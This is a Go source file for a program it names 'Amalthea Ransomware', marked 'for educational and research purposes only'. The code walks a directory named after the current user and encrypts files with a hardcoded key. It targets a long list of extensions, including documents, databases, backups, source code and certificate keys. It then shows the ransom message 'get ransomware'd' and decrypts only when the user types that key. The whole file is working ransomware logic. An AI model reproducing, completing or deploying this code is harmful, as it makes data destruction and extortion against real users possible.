package main

// Import all the required packages
import (
	"fmt"
	"log"
	"os/user"

	"github.com/UpperCenter/Amalthea/src/encryption"
	"github.com/UpperCenter/Amalthea/src/files"
)

func main() {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	// 32 Bit Encryption Password.
	key := "yjXTF0KtaEk3wOTdV2IZWbazSZPP8JMM"
	// Only encrypt files and folders in this directory & subdirectories.
	rootDir := user.Username
	// Only Encrypt these file extensions.
	fileextentions := []string{
		"DOC", "DOCX", "XLS", "XLSX", "PPT", "DAT",
		"PPTX", "PST", "OST", "EXE", "BIN", "CAB", "MSG", "EML", "VSD", "VSDX", "TXT",
		"CSV", "RTF", "WKS", "WK1", "PDF", "DWG", "ONETOC2", "SNT",
		"JPEG", "JPG", "DOCB", "DOCM", "DOT", "DOTM", "DOTX", "XLSM",
		"XLSB", "XLW", "XLT", "XLM", "XLC", "XLTX", "XLTM", "PPTM",
		"POT", "PPS", "PPSM", "PPSX", "PPAM", "POTX", "POTM", "EDB",
		"HWP", "62", "SXI", "STI", "SLDX", "SLDM", "VDI", "VMDK", "VMX",
		"GPG", "AES", "ARC", "PAQ", "BZ2", "TBK", "BAK", "TAR", "TGZ", "GZ",
		"7Z", "RAR", "ZIP", "BACKUP", "BIN", "BAC", "ISO", "VCD", "BMP", "PNG", "GIF", "RAW",
		"CGM", "TIF", "TIFF", "NEF", "PSD", "AI", "SVG", "DJVU", "M4U", "M3U",
		"MID", "WMA", "FLV", "3G2", "MKV", "3GP", "MP4", "MOV", "AVI", "ASF",
		"MPEG", "VOB", "MPG", "WMV", "FLA", "SWF", "WAV", "MP3", "SH", "CLASS",
		"JAR", "JAVA", "RB", "ASP", "PHP", "JSP", "BRD", "SCH", "DCH", "DIP", "PL",
		"VB", "VBS", "PS1", "BAT", "CMD", "JS", "TS", "ASM", "H", "PAS", "CPP", "C", "CS",
		"SUO", "SLN", "LDF", "MDF", "IBD", "MYI", "MYD", "FRM", "ODB", "DBF", "DB", "MDB",
		"ACCDB", "SQL", "SQLITEDB", "SQLITE3", "ASC", "LAY6", "LAY", "MML", "SXM", "OTG", "ODG",
		"UOP", "STD", "SXD", "OTP", "ODP", "WB2", "SLK", "DIF", "STC", "SXC", "OTS", "ODS",
		"3DM", "MAX", "3DS", "UOT", "STW", "SXW", "OTT", "ODT", "RPM",
		"PEM", "P12", "CSR", "CRT", "KEY", "PFX", "DER", "INK", "INC",
	}
	/*
		`size` defines the maximum file size to encrypt.
		32MB, as large files increase decryption time.
		32 * 1024 * 1024
	*/
	size := 33554432
	// Message to present to the user.
	message := "get ransomware'd"
	// Art Banner
	banner :=
		`
			 _______  _______  _______  _       _________          _______  _______ 
			 (  ___  )(       )(  ___  )( \      \__   __/|\     /|(  ____ \(  ___  )
			 | (   ) || () () || (   ) || (         ) (   | )   ( || (    \/| (   ) |
			 | (___) || || || || (___) || |         | |   | (___) || (__    | (___) |
			 |  ___  || |(_)| ||  ___  || |         | |   |  ___  ||  __)   |  ___  |
			 | (   ) || |   | || (   ) || |         | |   | (   ) || (      | (   ) |
			 | )   ( || )   ( || )   ( || (____/\   | |   | )   ( || (____/\| )   ( |
			 |/     \||/     \||/     \|(_______/   )_(   |/     \|(_______/|/     \|

		`
	fmt.Println(banner)

	// Calls `NewFiles` and begins searching for files to encrypt.
	e := files.NewFiles(rootDir, fileextentions, size)
	systemfiles, err := e.ScanToEncrypt()
	if err != nil {
		fmt.Println(err)
	}

	// Uses values gathered from `NewFiles` and encrypts using `key` paramiter.
	for _, file := range systemfiles {
		enc := encryption.NewEncryption(file, key)
		enc.EncryptFile()
	}

	fmt.Println("\nAmalthea Ransomware")
	fmt.Println("hello, world!")
	fmt.Println("\nFor educational and research purposes only.")
	fmt.Printf("Username: %s\n", rootDir)

	fmt.Println(message)
	// Prompt user for password to decrypt
	fmt.Printf("password:")
	var password string
	fmt.Scanln(&password)
	// Decrypt files, if valid password is provided.
	efs := files.NewFiles(rootDir, fileextentions, size)
	encryptedfiles, _ := efs.ScanToDecrypt()

	// Compare user provided password with set value
	if password == key {
		for _, file := range encryptedfiles {
			// Decrypts files if password is correct.
			enc := encryption.NewEncryption(file, key)
			enc.DecryptFile()
		}
		fmt.Println(encryptedfiles)
		// Print an error if decryption fails.
	} else {
		fmt.Println("Decryption Failed.")

	}
}
